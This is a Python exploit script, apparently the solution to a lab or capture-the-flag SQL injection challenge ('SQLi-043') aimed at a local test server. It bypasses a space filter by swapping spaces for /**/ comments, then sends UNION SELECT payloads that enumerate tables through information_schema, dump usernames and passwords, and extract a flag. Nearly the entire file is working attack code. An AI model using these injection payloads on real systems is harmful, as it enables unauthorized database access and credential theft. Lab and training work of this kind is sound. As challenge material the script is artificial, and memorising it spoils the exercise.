#!/usr/bin/env python3
"""SQLi-043: MySQL Space Filter Bypass - Exploit Script"""

import requests
import sys
from urllib.parse import quote

TARGET_URL = "http://localhost:5043/search"

def bypass_space(payload):
    """Replace spaces with /**/ comments"""
    return payload.replace(" ", "/**/")

def send_payload(payload):
    """Send payload and return response"""
    bypassed = bypass_space(payload)
    params = {"q": bypassed}
    try:
        r = requests.get(TARGET_URL, params=params, timeout=10)
        return r.text
    except Exception as e:
        print(f"[!] Error: {e}")
        return None

def extract_tables():
    """Extract table names"""
    print("[*] Extracting table names...")
    payload = "test' UNION SELECT 1,table_name,'x',4 FROM information_schema.tables WHERE table_schema=database()-- "
    response = send_payload(payload)
    
    if response:
        # Parse tables from response
        tables = []
        for table in ['products', 'users', 'flags']:
            if table in response:
                tables.append(table)
                print(f"    [+] Found table: {table}")
        return tables
    return []

def extract_columns(table_name):
    """Extract column names for a table"""
    print(f"[*] Extracting columns from '{table_name}'...")
    payload = f"test' UNION SELECT 1,column_name,'x',4 FROM information_schema.columns WHERE table_name='{table_name}'-- "
    response = send_payload(payload)
    return response

def extract_flag():
    """Extract flag from flags table"""
    print("[*] Extracting flag...")
    payload = "test' UNION SELECT 1,name,value,4 FROM flags-- "
    response = send_payload(payload)
    
    if response and "FLAG{" in response:
        # Extract flag from response
        start = response.find("FLAG{")
        end = response.find("}", start) + 1
        flag = response[start:end]
        return flag
    return None

def extract_users():
    """Extract users and passwords"""
    print("[*] Extracting user credentials...")
    payload = "test' UNION SELECT 1,username,password,4 FROM users-- "
    response = send_payload(payload)
    return response

def main():
    print("=" * 60)
    print("SQLi-043: MySQL Space Filter Bypass Exploit")
    print("=" * 60)
    print(f"\n[*] Target: {TARGET_URL}")
    print("[*] Bypass technique: /**/ comments\n")
    
    # Step 1: Test injection
    print("[1] Testing injection point...")
    test_payload = "test' OR '1'='1"
    response = send_payload(test_payload)
    if response and "Gaming Laptop" in response:
        print("    [+] Injection successful!")
    else:
        print("    [-] Injection failed")
        return
    
    # Step 2: Extract tables
    print("\n[2] Enumerating tables...")
    tables = extract_tables()
    
    # Step 3: Extract users
    print("\n[3] Extracting credentials...")
    extract_users()
    
    # Step 4: Get flag
    print("\n[4] Getting flag...")
    flag = extract_flag()
    
    if flag:
        print("\n" + "=" * 60)
        print(f"[+] FLAG FOUND: {flag}")
        print("=" * 60)
    else:
        print("[-] Could not extract flag")

if __name__ == "__main__":
    main()
